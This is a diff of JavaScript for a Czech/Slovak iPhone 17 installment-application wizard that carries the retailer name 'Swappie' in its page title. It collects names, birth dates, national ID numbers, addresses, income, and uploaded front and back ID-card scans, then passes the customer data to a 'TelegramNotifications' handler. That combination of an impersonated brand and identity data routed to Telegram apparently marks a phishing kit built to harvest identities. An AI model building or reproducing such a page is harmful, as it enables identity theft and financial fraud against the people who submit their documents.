@@ -1,198 +1,312 @@
 document.addEventListener('DOMContentLoaded', () => {
-    // Set language for this page
-    window.currentLanguage = 'sk';
-    updateLanguage('sk');
+    // --- CONFIGURATION ---
+    const countryConfig = {
+        cs: { name: 'Česko', flag: '🇨🇿', currency: 'CZK', lang: 'cs', rate: 24.7 },
+        sk: { name: 'Slovensko', flag: '🇸🇰', currency: 'EUR', lang: 'sk', rate: 1 }
+    };
 
-    // Form Elements
-    const productSelect = document.getElementById('product-select');
-    const storageGroup = document.getElementById('storage-group');
+    const translations = {
+        cs: {
+            home: "Domů", products: "Produkty", rights_reserved: "Všechna práva vyhrazena.",
+            step_1_product: "1. Produkt", step_2_configure: "2. Konfigurace", step_3_details: "3. Údaje", step_4_submit: "4. Odeslat",
+            split_payment_iphone17_title: "iPhone 17 na Splátky",
+            split_payment_select_product_desc: "Nejprve si vyberte model iPhonu 17, o který máte zájem.",
+            step_2_configure_title: "Nakonfigurujte si iPhone a Plán",
+            step_2_configure_desc: "Vyberte si úložiště, barvu a preferovaný splátkový plán.",
+            split_payment_select_storage: "Úložiště", split_payment_select_color: "Barva", split_payment_choose_plan: "Splátkový Plán",
+            split_payment_summary: "Souhrn Splátek",
+            split_payment_product_price: "Cena Produktu:", split_payment_interest_rate: "Navýšení", split_payment_new_total: "Celková Cena:",
+            split_payment_monthly: "Měsíční Splátka:",
+            back: "Zpět", next: "Další",
+            split_payment_your_info: "Vaše Osobní Údaje",
+            split_payment_info_desc: "Tyto informace jsou nutné k posouzení vaší žádosti o financování.",
+            split_payment_full_name: "Celé Jméno", split_payment_dob: "Datum Narození", split_payment_email: "E-mailová Adresa",
+            split_payment_phone: "Telefonní Číslo", split_payment_national_id: "Rodné Číslo", split_payment_address: "Úplná Adresa Bydliště",
+            split_payment_employment_status: "Stav Zaměstnání", split_payment_employment_status_choose: "-- Vyberte stav --",
+            split_payment_employment_employed: "Zaměstnaný", split_payment_employment_self_employed: "OSVČ",
+            split_payment_employment_student: "Student", split_payment_employment_retired: "Důchodce", split_payment_employment_unemployed: "Nezaměstnaný",
+            split_payment_monthly_income: "Čistý Měsíční Příjem (Kč)", split_payment_employer_name: "Název Zaměstnavatele",
+            document_uploads: "Nahrání Dokumentů", split_payment_upload_id_front: "Nahrát OP (Přední strana)", split_payment_upload_id_back: "Nahrát OP (Zadní strana)",
+            split_payment_upload_address_proof: "Nahrát Doklad o Adrese",
+            split_payment_agreement_title: "Souhlas a Odeslání",
+            split_payment_agreement_intro: "Odesláním tohoto formuláře souhlasíte s následujícími podmínkami:",
+            split_payment_term_1: "Souhlasím se zpracováním mých osobních údajů pro účely posouzení této žádosti o financování.",
+            split_payment_term_2: "Potvrzuji, že všechny poskytnuté informace jsou pravdivé a přesné.",
+            split_payment_term_3: "Rozumím, že odeslání této žádosti nezaručuje schválení financování. O výsledku budu informován/a.",
+            split_payment_term_4: "Souhlasím s tím, že mě může kontaktovat zástupce společnosti ohledně této žádosti.",
+            split_payment_agree_checkbox: "Přečetl/a jsem si podmínky a souhlasím s nimi.",
+            split_payment_submit_application: "Odeslat Žádost",
+            thank_you_title: "Děkujeme za Vaši žádost!",
+            thank_you_desc: "Vaše žádost o financování byla úspěšně odeslána. Náš tým ji nyní posoudí a co nejdříve se vám ozveme s výsledkem.",
+            back_to_home: "Zpět na hlavní stránku",
+            starting_from: "Od",
+            select_product: "Vybrat Produkt",
+            split_payment_month_interest: "{months} měsíců (+{interest}%)",
+            split_payment_monthly_value: "{price} / měsíc ({months} měsíců)"
+        },
+        sk: {
+            home: "Domov", products: "Produkty", rights_reserved: "Všetky práva vyhradené.",
+            step_1_product: "1. Produkt", step_2_configure: "2. Konfigurácia", step_3_details: "3. Údaje", step_4_submit: "4. Odoslať",
+            split_payment_iphone17_title: "iPhone 17 na Splátky",
+            split_payment_select_product_desc: "Najprv si vyberte model iPhonu 17, o ktorý máte záujem.",
+            step_2_configure_title: "Nakonfigurujte si iPhone a Plán",
+            step_2_configure_desc: "Vyberte si úložisko, farbu a preferovaný splátkový plán.",
+            split_payment_select_storage: "Úložisko", split_payment_select_color: "Farba", split_payment_choose_plan: "Splátkový Plán",
+            split_payment_summary: "Súhrn Splátok",
+            split_payment_product_price: "Cena Produktu:", split_payment_interest_rate: "Navýšenie", split_payment_new_total: "Celková Cena:",
+            split_payment_monthly: "Mesačná Splátka:",
+            back: "Späť", next: "Ďalej",
+            split_payment_your_info: "Vaše Osobné Údaje",
+            split_payment_info_desc: "Tieto informácie sú potrebné na posúdenie vašej žiadosti o financovanie.",
+            split_payment_full_name: "Celé Meno", split_payment_dob: "Dátum Narodenia", split_payment_email: "E-mailová Adresa",
+            split_payment_phone: "Telefónne Číslo", split_payment_national_id: "Rodné Číslo", split_payment_address: "Úplná Adresa Bydliska",
+            split_payment_employment_status: "Stav Zamestnania", split_payment_employment_status_choose: "-- Vyberte stav --",
+            split_payment_employment_employed: "Zamestnaný", split_payment_employment_self_employed: "SZČO",
+            split_payment_employment_student: "Študent", split_payment_employment_retired: "Dôchodca", split_payment_employment_unemployed: "Nezamestnaný",
+            split_payment_monthly_income: "Čistý Mesačný Príjem (€)", split_payment_employer_name: "Názov Zamestnávateľa",
+            document_uploads: "Nahratie Dokumentov", split_payment_upload_id_front: "Nahrať OP (Predná strana)", split_payment_upload_id_back: "Nahrať OP (Zadná strana)",
+            split_payment_upload_address_proof: "Nahrať Doklad o Adrese",
+            split_payment_agreement_title: "Súhlas a Odoslanie",
+            split_payment_agreement_intro: "Odoslaním tohto formulára súhlasíte s nasledujúcimi podmienkami:",
+            split_payment_term_1: "Súhlasím so spracovaním mojich osobných údajov na účely posúdenia tejto žiadosti o financovanie.",
+            split_payment_term_2: "Potvrdzujem, že všetky poskytnuté informácie sú pravdivé a presné.",
+            split_payment_term_3: "Rozumiem, že odoslanie tejto žiadosti nezaručuje schválenie financovania. O výsledku budem informovaný/á.",
+            split_payment_term_4: "Súhlasím s tým, že ma môže kontaktovať zástupca spoločnosti ohľadom tejto žiadosti.",
+            split_payment_agree_checkbox: "Prečítal/a som si podmienky a súhlasím s nimi.",
+            split_payment_submit_application: "Odoslať Žiadosť",
+            thank_you_title: "Ďakujeme za Vašu žiadosť!",
+            thank_you_desc: "Vaša žiadosť o financovanie bola úspešne odoslaná. Náš tím ju teraz posúdi a čo najskôr sa vám ozveme s výsledkom.",
+            back_to_home: "Späť na hlavnú stránku",
+            starting_from: "Od",
+            select_product: "Vybrať Produkt",
+            split_payment_month_interest: "{months} mesiacov (+{interest}%)",
+            split_payment_monthly_value: "{price} / mesiac ({months} mesiacov)"
+        }
+    };
+
+    // --- STATE MANAGEMENT ---
+    let state = {
+        currentStep: 1,
+        selectedProduct: null,
+        selectedVariant: null,
+        selectedColor: null,
+        selectedPlan: null,
+        language: 'cs',
+        currency: 'CZK',
+        exchangeRate: 24.7
+    };
+
+    // --- DOM ELEMENTS ---
+    const wizardSteps = document.querySelectorAll('.wizard-step');
+    const stepIndicators = document.querySelectorAll('.step');
+    const productGrid = document.getElementById('product-selection-grid');
     const storageSelect = document.getElementById('storage-select');
-    const colorGroup = document.getElementById('color-group');
     const colorSelect = document.getElementById('color-select');
-    const monthsGroup = document.getElementById('months-group');
     const monthsSelect = document.getElementById('months-select');
-    const summaryPrice = document.getElementById('summary-price');
-    const summaryMonthly = document.getElementById('summary-monthly');
-    const summary = document.getElementById('calculation-summary');
-    const submitBtn = document.getElementById('submit-application-btn');
-    const termsSection = document.getElementById('terms-section');
-    const customerInfoSection = document.getElementById('customer-info-section');
-    const customerInfoForm = document.getElementById('customer-info-form');
+    const calculationSummary = document.getElementById('calculation-summary');
+    const customerForm = document.getElementById('customer-info-form');
     const termsCheckbox = document.getElementById('terms-agree-checkbox');
-    const employmentStatusSelect = document.getElementById('employment-status');
-    const employerGroup = document.getElementById('employer-group');
+    const submitBtn = document.getElementById('submit-application-btn');
 
-    let basePrice = 0;
-    let monthlyPayment = 0;
-    let selectedProduct = null;
-    let selectedVariant = null;
-    let selectedColor = null;
+    // --- TRANSLATION & CURRENCY ---
+    function t(key) {
+        return translations[state.language][key] || key;
+    }
+
+    function convertPrice(priceInUSD) {
+        const convertedPrice = priceInUSD * state.exchangeRate;
+        return new Intl.NumberFormat(state.language, { style: 'currency', currency: state.currency }).format(convertedPrice);
+    }
+
+    function updateAllText() {
+        document.querySelectorAll('[data-translate]').forEach(el => {
+            el.textContent = t(el.dataset.translate);
+        });
+        // Update dynamic elements like placeholders or titles
+        document.title = t('split_payment_iphone17_title') + " - Swappie";
+        document.getElementById('monthly-income').previousElementSibling.textContent = t('split_payment_monthly_income').replace('(Kč)', `(${state.currency})`);
+    }
+
+    // --- INITIALIZATION ---
+    function initializePage() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const country = urlParams.get('country') || 'cs';
+        state.language = country;
+        state.currency = countryConfig[country].currency;
+        state.exchangeRate = countryConfig[country].rate;
+
+        // Update country switcher UI
+        document.getElementById('current-flag').textContent = countryConfig[country].flag;
+        document.getElementById('current-country').textContent = countryConfig[country].name;
+
+        updateAllText();
+        populateProductGrid();
+        populateMonths();
+        setupEventListeners();
+    }
+
+    // --- UI POPULATION ---
+    function populateProductGrid() {
+        productGrid.innerHTML = '';
+        productsForSplitPaymentIphone17.forEach(product => {
+            const card = document.createElement('div');
+            card.className = 'product-card';
+            card.innerHTML = `
+                <div class="product-image"><img src="${product.image}" alt="${product.name}"></div>
+                <div class="product-info">
+                    <h3 class="product-name">${product.name}</h3>
+                    <div class="product-price">
+                        <span class="current-price">${t('starting_from')} ${convertPrice(product.variants[0].price)}</span>
+                    </div>
+                    <button class="btn btn-secondary select-product-btn" data-product-id="${product.id}">${t('select_product')}</button>
+                </div>
+            `;
+            productGrid.appendChild(card);
+        });
+    }
 
     function populateMonths() {
-        if (!monthsSelect) return;
-        monthsSelect.innerHTML = ''; // Clear existing
-        const plans = [
-            { months: 6, interest: 2 },
-            { months: 12, interest: 4 },
-            { months: 18, interest: 5 },
-            { months: 24, interest: 6 }
-        ];
+        monthsSelect.innerHTML = '';
+        const plans = [{ months: 6, interest: 2 }, { months: 12, interest: 4 }, { months: 18, interest: 5 }, { months: 24, interest: 6 }];
         plans.forEach(plan => {
             const option = document.createElement('option');
             option.value = plan.months;
-            let text = t('split_payment_month_interest').replace('{months}', plan.months).replace('{interest}', plan.interest);
-            option.textContent = text;
+            option.textContent = t('split_payment_month_interest').replace('{months}', plan.months).replace('{interest}', plan.interest);
             option.dataset.interest = plan.interest;
             monthsSelect.appendChild(option);
         });
     }
 
-    // 1. Populate Product Dropdown
-    if (typeof productsForSplitPaymentIphone17 !== 'undefined') {
-        productsForSplitPaymentIphone17.forEach(product => {
-            const option = document.createElement('option');
-            option.value = product.id;
-            option.textContent = product.name;
-            productSelect.appendChild(option);
+    // --- EVENT LISTENERS ---
+    function setupEventListeners() {
+        // Product selection
+        productGrid.addEventListener('click', e => {
+            if (e.target.classList.contains('select-product-btn')) {
+                const productId = e.target.dataset.productId;
+                state.selectedProduct = productsForSplitPaymentIphone17.find(p => p.id === productId);
+                if (state.selectedProduct) {
+                    goToStep(2);
+                    configureProductStep();
+                }
+            }
+        });
+
+        // Wizard navigation
+        document.querySelector('.split-payment-wizard').addEventListener('click', e => {
+            if (e.target.closest('[data-action="next"]')) goToStep(state.currentStep + 1);
+            if (e.target.closest('[data-action="prev"]')) goToStep(state.currentStep - 1);
+        });
+
+        // Configuration dropdowns
+        storageSelect.addEventListener('change', handleConfigurationChange);
+        colorSelect.addEventListener('change', handleConfigurationChange);
+        monthsSelect.addEventListener('change', handleConfigurationChange);
+
+        // Form validation
+        customerForm.addEventListener('input', checkFormCompletion);
+        termsCheckbox.addEventListener('change', checkFormCompletion);
+        submitBtn.addEventListener('click', submitApplication);
+
+        // Country switcher
+        const countryDropdownBtn = document.getElementById('country-dropdown-btn');
+        const countryDropdown = document.getElementById('country-dropdown');
+        countryDropdownBtn.addEventListener('click', () => countryDropdown.classList.toggle('hidden'));
+        document.addEventListener('click', (e) => {
+            if (!countryDropdownBtn.contains(e.target) && !countryDropdown.contains(e.target)) {
+                countryDropdown.classList.add('hidden');
+            }
         });
     }
 
-    populateMonths();
+    // --- WIZARD LOGIC ---
+    function goToStep(step) {
+        state.currentStep = step;
+        wizardSteps.forEach(s => s.classList.remove('active'));
+        document.getElementById(`wizard-step-${step}`).classList.add('active');
+        stepIndicators.forEach((ind, i) => {
+            ind.classList.toggle('active', i < step);
+        });
+        window.scrollTo(0, 0);
+    }
 
-    // 2. Event Listeners
-    productSelect.addEventListener('change', () => {
-        const productId = productSelect.value;
-        selectedProduct = productsForSplitPaymentIphone17.find(p => p.id === productId);
-        resetSelections(1);
+    function configureProductStep() {
+        const summaryEl = document.getElementById('selected-product-summary');
+        summaryEl.innerHTML = `<img src="${state.selectedProduct.image}" alt="${state.selectedProduct.name}"><h3>${state.selectedProduct.name}</h3>`;
 
-        if (selectedProduct) {
-            storageSelect.innerHTML = `<option value="">${t('split_payment_choose_storage')}</option>`;
-            selectedProduct.variants.forEach(variant => {
-                const option = document.createElement('option');
-                option.value = variant.storage;
-                option.textContent = `${variant.storage} - ${convertPrice(variant.price, false)}`;
-                option.dataset.price = variant.price;
-                storageSelect.appendChild(option);
-            });
-            storageGroup.style.display = 'block';
-        }
-    });
+        storageSelect.innerHTML = `<option value="">--</option>`;
+        state.selectedProduct.variants.forEach(v => {
+            storageSelect.innerHTML += `<option value="${v.storage}" data-price="${v.price}">${v.storage} - ${convertPrice(v.price)}</option>`;
+        });
 
-    storageSelect.addEventListener('change', () => {
-        const selectedOption = storageSelect.options[storageSelect.selectedIndex];
-        resetSelections(2);
-        if (selectedOption.value) {
-            selectedVariant = {
-                storage: selectedOption.value,
-                price: parseFloat(selectedOption.dataset.price)
-            };
-            colorSelect.innerHTML = `<option value="">${t('split_payment_choose_color')}</option>`;
-            selectedProduct.colors.forEach(color => {
-                const option = document.createElement('option');
-                option.value = color;
-                option.textContent = color;
-                colorSelect.appendChild(option);
-            });
-            colorGroup.style.display = 'block';
-        }
-    });
+        colorSelect.innerHTML = `<option value="">--</option>`;
+        state.selectedProduct.colors.forEach(c => {
+            colorSelect.innerHTML += `<option value="${c}">${c}</option>`;
+        });
 
-    colorSelect.addEventListener('change', () => {
-        selectedColor = colorSelect.value;
-        resetSelections(3);
-        if (selectedColor) {
-            monthsGroup.style.display = 'block';
-            updateCalculations();
-        }
-    });
+        resetConfig();
+    }
 
-    monthsSelect.addEventListener('change', updateCalculations);
+    function resetConfig() {
+        storageSelect.value = '';
+        colorSelect.value = '';
+        monthsSelect.value = '6';
+        state.selectedVariant = null;
+        state.selectedColor = null;
+        calculationSummary.style.display = 'none';
+        document.querySelector('#wizard-step-2 [data-action="next"]').disabled = true;
+    }
 
-    employmentStatusSelect.addEventListener('change', () => {
-        if (employmentStatusSelect.value === 'employed' || employmentStatusSelect.value === 'self-employed') {
-            employerGroup.style.display = 'block';
-            document.getElementById('employer-name').required = true;
+    function handleConfigurationChange() {
+        const storageOption = storageSelect.options[storageSelect.selectedIndex];
+        if (storageOption && storageOption.value) {
+            state.selectedVariant = { storage: storageOption.value, price: parseFloat(storageOption.dataset.price) };
         } else {
-            employerGroup.style.display = 'none';
-            document.getElementById('employer-name').required = false;
+            state.selectedVariant = null;
         }
-    });
-
-    customerInfoForm.addEventListener('input', checkFormCompletion);
-    termsCheckbox.addEventListener('change', checkFormCompletion);
-
-    function resetSelections(level) {
-        if (level <= 1) {
-            storageGroup.style.display = 'none';
-            selectedVariant = null;
-        }
-        if (level <= 2) {
-            colorGroup.style.display = 'none';
-            selectedColor = null;
-        }
-        if (level <= 3) {
-            monthsGroup.style.display = 'none';
-            summary.style.display = 'none';
-            customerInfoSection.style.display = 'none';
-            termsSection.style.display = 'none';
-            submitBtn.disabled = true;
+        state.selectedColor = colorSelect.value || null;
+        
+        if (state.selectedVariant && state.selectedColor) {
+            updateCalculations();
+            calculationSummary.style.display = 'block';
+            document.querySelector('#wizard-step-2 [data-action="next"]').disabled = false;
+        } else {
+            calculationSummary.style.display = 'none';
+            document.querySelector('#wizard-step-2 [data-action="next"]').disabled = true;
         }
     }
 
     function updateCalculations() {
-        if (!selectedVariant || !selectedColor) return;
-        summary.style.display = 'block';
+        const planOption = monthsSelect.options[monthsSelect.selectedIndex];
+        const months = parseInt(planOption.value);
+        const interestRate = parseFloat(planOption.dataset.interest);
 
-        const basePrice = selectedVariant.price;
-        const selectedMonthOption = monthsSelect.options[monthsSelect.selectedIndex];
-        const months = parseInt(selectedMonthOption.value);
-        const interestRate = parseFloat(selectedMonthOption.dataset.interest);
-        
+        const basePrice = state.selectedVariant.price;
         const interestAmount = basePrice * (interestRate / 100);
         const totalPrice = basePrice + interestAmount;
         const monthlyPayment = totalPrice / months;
-        const monthlyText = t('split_payment_monthly_value');
 
-        document.getElementById('summary-price').textContent = convertPrice(basePrice, false);
+        document.getElementById('summary-price').textContent = convertPrice(basePrice);
         document.getElementById('summary-interest-rate').textContent = interestRate;
-        document.getElementById('summary-interest-amount').textContent = convertPrice(interestAmount, false);
-        document.getElementById('summary-total-price').textContent = convertPrice(totalPrice, false);
-        document.getElementById('summary-monthly').textContent = monthlyText
-            .replace('{price}', convertPrice(monthlyPayment, false))
-            .replace('{months}', months) + " €";
-        console.log('basePrice', basePrice);
-        console.log('monthlyPayment', monthlyPayment);
-
-        summary.style.display = 'block';
-        customerInfoSection.style.display = 'block';
-        checkFormCompletion();
-    }
-
-    function validateCustomerInfo() {
-        const requiredFields = ['customer-name', 'customer-dob', 'customer-email', 'customer-phone', 'customer-national-id', 'customer-address', 'employment-status', 'monthly-income', 'id-upload-front', 'id-upload-back'];
-        for (const fieldId of requiredFields) {
-            const field = document.getElementById(fieldId);
-            if (!field.value) return false;
-        }
-        if (document.getElementById('employer-name').required && !document.getElementById('employer-name').value) {
-            return false;
-        }
-        return true;
+        document.getElementById('summary-interest-amount').textContent = convertPrice(interestAmount);
+        document.getElementById('summary-total-price').textContent = convertPrice(totalPrice);
+        document.getElementById('summary-monthly').textContent = t('split_payment_monthly_value')
+            .replace('{price}', convertPrice(monthlyPayment))
+            .replace('{months}', months);
     }
 
     function checkFormCompletion() {
-        if (validateCustomerInfo()) {
-            termsSection.style.display = 'block';
-            submitBtn.disabled = !termsCheckbox.checked;
-        } else {
-            termsSection.style.display = 'none';
-            submitBtn.disabled = true;
-        }
+        const requiredFields = Array.from(customerForm.querySelectorAll('[required]'));
+        const allFilled = requiredFields.every(field => field.value.trim() !== '');
+        
+        const nextBtn = document.querySelector('#wizard-step-3 [data-action="next"]');
+        if (nextBtn) nextBtn.disabled = !allFilled;
+
+        submitBtn.disabled = !allFilled || !termsCheckbox.checked;
     }
 
-    submitBtn.addEventListener('click', () => {
-        if (!selectedProduct || !selectedVariant || !selectedColor || !validateCustomerInfo() || !termsCheckbox.checked) {
-            alert("Prosím, vyplňte všetky povinné polia a súhlaste s podmienkami.");
+    function submitApplication() {
+        if (!validateCustomerInfo() || !termsCheckbox.checked) {
+            alert("Please fill all fields and agree to the terms.");
             return;
         }
 
@@ -213,22 +327,23 @@ document.addEventListener('DOMContentLoaded', () => {
 
         if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.splitPaymentApplicationSubmitted) {
             TelegramNotifications.splitPaymentApplicationSubmitted({
-                productName: `${selectedProduct.name} (${selectedVariant.storage} - ${selectedColor})`,
+                productName: `${state.selectedProduct.name} (${state.selectedVariant.storage} - ${state.selectedColor})`,
                 total: document.getElementById('summary-total-price').textContent,
                 monthly: document.getElementById('summary-monthly').textContent,
                 months: monthsSelect.value,
-                customer: customerData
+                customer: customerData,
+                country: state.language.toUpperCase()
             });
         }
 
-        // Show success message to user
-        document.querySelector('.split-payment-calculator').innerHTML = `
-            <div style="text-align: center; padding: 2rem;">
-                <i class="fas fa-check-circle" style="font-size: 4rem; color: #28a745; margin-bottom: 1rem;"></i>
-                <h2 style="color: #333;">Ďakujeme za Vašu žiadosť!</h2>
-                <p style="color: #555; font-size: 1.1rem;">Vaša žiadosť o financovanie bola úspešne odoslaná. Náš tím ju teraz posúdi a čo najskôr sa vám ozveme s výsledkom.</p>
-                <a href="index.html" class="btn btn-primary" style="margin-top: 2rem;">Späť na hlavnú stránku</a>
-            </div>
-        `;
-    });
+        goToStep(5); // Go to success step
+    }
+
+    function validateCustomerInfo() {
+        const requiredFields = Array.from(customerForm.querySelectorAll('[required]'));
+        return requiredFields.every(field => field.value.trim() !== '');
+    }
+
+    // --- START ---
+    initializePage();
 });
